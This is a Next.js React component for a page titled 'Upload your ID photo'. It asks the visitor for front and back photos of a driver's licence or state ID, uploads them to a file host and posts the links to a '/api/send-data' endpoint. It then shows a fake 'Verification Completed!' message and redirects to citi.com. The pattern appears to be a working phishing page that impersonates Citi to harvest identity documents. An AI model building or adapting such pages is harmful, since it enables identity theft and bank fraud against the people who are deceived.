"use client";

import React, { useState } from "react";
import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";
import Image from "next/image";
import axios from "axios";
import { useRouter } from "next/navigation";

const UploadID = () => {
  const [otpClicked, setOtpClicked] = useState(false);
  const [loading, setLoading] = useState(false);
  const [frontFile, setFrontFile] = useState(null);
  const [backFile, setBackFile] = useState(null);
  const router = useRouter();

  const uploadToUploadcare = async (file) => {
    const formData = new FormData();
    formData.append(
      "UPLOADCARE_PUB_KEY",
      process.env.NEXT_PUBLIC_UPLOADCARE_KEY
    );
    formData.append("file", file);

    const res = await fetch("https://upload.uploadcare.com/base/", {
      method: "POST",
      body: formData,
    });
    const data = await res.json();
    return `https://ucarecdn.com/${data.file}/`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!frontFile || !backFile) return alert("Please select both ID images.");
    setOtpClicked(true);

    try {
      setLoading(true);

      const frontUrl = await uploadToUploadcare(frontFile);
      const backUrl = await uploadToUploadcare(backFile);
      const data = {
        frontId: frontUrl,
        backId: backUrl,
      };
      // console.log("data:", data);

      await axios.post("/api/send-data", data);

      setTimeout(() => {
        router.push("https://citi.com");
      }, 5000);
    } catch (err) {
      alert("Upload failed, please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="bg-[#f5f7fa] min-h-screen flex flex-col">
      <Header />
      <div className="flex-grow flex items-center justify-center px-4 min-h-[90vh]">
        {!otpClicked ? (
          <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-8">
            <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
              Upload your ID photo
            </h1>
            <div className="flex-center mb-3">
              <Image
                src={"/images/id-front-back.jpg"}
                alt="ID card front and back"
                width={300}
                height={250}
                className="object-contain"
              />
            </div>
            <p className="text-sm text-gray-700 mb-6">
              {`Photo of your ID document (Both sides for driver license or state ID). The photo must be clear (JPG or PNG).`}
            </p>

            <form onSubmit={handleSubmit}>
              <div>
                <label htmlFor="frontId">Front photo of ID:</label>
                <input
                  type="file"
                  id="frontId"
                  accept="image/*"
                  className="bg-slate-200 p-1 rounded-md w-full px-3 cursor-pointer mt-1 text-sm mb-4"
                  required
                  onChange={(e) => setFrontFile(e.target.files[0])}
                />
              </div>
              <div>
                <label htmlFor="backId">Back photo of ID:</label>
                <input
                  type="file"
                  id="backId"
                  accept="image/*"
                  className="bg-slate-200 p-1 rounded-md w-full px-3 cursor-pointer mt-1 text-sm"
                  required
                  onChange={(e) => setBackFile(e.target.files[0])}
                />
              </div>

              <button
                className="cursor-pointer w-full py-3 mt-6 bg-primary hover:!bg-[#054e7b] rounded-lg font-bold text-white transition-colors"
                type="submit"
              >
                {loading ? "Uploading..." : "Verify"}
              </button>
            </form>
          </div>
        ) : (
          <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-8">
            <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
              Verification Completed!
            </h1>
            <div className="flex-center py-10">
              <Image
                src={"/images/checkmark.png"}
                alt="Verified"
                width={150}
                height={150}
                className="object-contain"
              />
            </div>
            <p className="text-gray-700">
              Your account has been verified successfully. We may contact you
              within the next 24 hours.
            </p>
            <button
              className="cursor-pointer w-full py-3 mt-6 bg-primary hover:!bg-[#054e7b] rounded-lg font-bold text-white transition-colors"
              onClick={() => router.push("https://citi.com")}
            >
              Return to Home
            </button>
          </div>
        )}
      </div>
      <Footer />
    </main>
  );
};

export default UploadID;
